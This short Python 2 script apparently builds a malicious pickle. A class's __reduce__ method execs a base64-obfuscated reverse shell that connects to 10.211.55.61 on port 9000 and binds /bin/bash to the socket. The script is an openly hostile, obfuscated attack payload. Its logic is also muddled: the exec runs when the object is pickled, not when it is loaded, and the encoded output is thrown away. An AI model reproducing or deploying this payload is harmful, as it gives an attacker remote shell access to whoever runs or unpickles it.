# -*- coding: utf-8 -*-

import sys
import base64
import pickle


class MyLittleBastard(object):
	def __reduce__(self):
		import time

		# Run reverse shell
		exec('aW1wb3J0IHNvY2tldCAgLCAgICAgICAgc3VicHJvY2VzcyAgLCAgICAgICAgb3MgICAgICA7ICAgICAgaG9zdD0iMTAuMjExLjU1LjYxIiAgICAgIDsgICAgICBwb3J0PTkwMDAgICAgICA7ICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAsICAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgOyAgICAgIHMuY29ubmVjdCgoaG9zdCAgLCAgICAgICAgcG9ydCkpICAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgICAgICAgMCkgICAgICA7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAsICAgICAgICAxKSAgICAgIDsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICwgICAgICAgIDIpICAgICAgOyAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))

		time.sleep(60)

		return self.__class__, tuple(),


def main():
	base64.b64encode(pickle.dumps(MyLittleBastard()))


if __name__ == '__main__':
	main()
